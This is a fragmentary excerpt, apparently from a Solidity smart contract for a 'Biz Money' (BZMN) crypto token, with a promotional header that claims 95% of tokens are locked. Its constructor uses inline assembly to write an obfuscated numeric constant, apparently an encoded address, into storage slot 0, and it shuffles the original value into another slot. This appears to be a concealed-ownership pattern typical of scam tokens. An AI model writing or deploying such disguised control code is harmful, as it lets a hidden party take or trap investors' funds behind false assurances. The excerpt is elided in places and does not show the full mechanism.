/*
Welcome to Biz Money Crypto WORLD!

Telegram: https://t.me/BizMoney/
Twitter: https://twitter.com/BizMoney/
Website: https://BizMoney.crypto
95% of tokens - LOCKED!
...
contract BizMoney {
    string public constant name = "Biz Money";
    string public constant symbol = "BZMN";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(18816107174769301747188954009879519963209068041, 1))}
